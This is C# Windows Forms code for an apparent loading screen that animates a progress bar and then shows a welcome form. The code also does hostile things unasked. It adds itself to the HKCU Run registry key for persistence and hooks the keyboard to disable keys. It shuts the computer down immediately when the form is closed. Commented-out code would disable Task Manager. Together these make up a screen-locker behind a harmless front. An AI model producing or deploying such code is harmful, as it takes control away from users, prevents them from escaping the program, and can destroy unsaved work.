using LogDesk;
using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace LoadingScreen
{
    public partial class LoadingScreen : Form
    {
        EnableDisableKeys ed = new EnableDisableKeys();
        RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        public LoadingScreen()
        {
          reg.SetValue("MyApplication", Application.ExecutablePath.ToString());
            InitializeComponent();
            //            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
            //              @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            //        if (objRegistryKey.GetValue("DisableTaskMgr") == null)
            //          objRegistryKey.SetValue("DisableTaskMgr", "1");
             
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            panel2.Width += 3;

            if(panel2.Width >= 1380)
            {
                timer1.Stop();
                WelScreen FM2 = new WelScreen();
                FM2.Show();
                this.Hide();
            }
        }

        private void LoadingScreen_FormClosing(object sender, FormClosingEventArgs e)
        {
            System.Diagnostics.Process.Start("shutdown", "/s /t 0");
        }

        private void LoadingScreen_Load(object sender, EventArgs e)
        {
            ed.KeyHook();
        }
    }
}